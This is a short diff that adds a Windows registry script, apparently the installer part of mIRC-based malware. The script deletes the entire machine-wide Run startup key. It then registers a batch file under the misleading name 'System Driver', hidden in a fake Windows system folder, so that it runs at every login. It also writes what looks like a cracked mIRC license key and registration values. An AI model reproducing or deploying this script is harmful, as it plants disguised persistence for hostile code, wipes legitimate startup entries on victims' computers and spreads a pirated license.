@@ -1,0 +1,22 @@
+REGEDIT4
+[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+
+REGEDIT4
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"System Driver"="C:\\windows\\system\\msdn\\register.bat"
+
+Windows Registry Editor Version 5.00
+[HKEY_CURRENT_USER\Software\mIRC]
+
+[HKEY_CURRENT_USER\Software\mIRC\LastRun]
+@="1231382579,0"
+
+[HKEY_CURRENT_USER\Software\mIRC\License]
+@="3749-303624"
+
+[HKEY_CURRENT_USER\Software\mIRC\UserName]
+@="Tor Heh"
+
+[HKEY_CURRENT_USER\Software\mIRC\Validated]
+@="666"
+
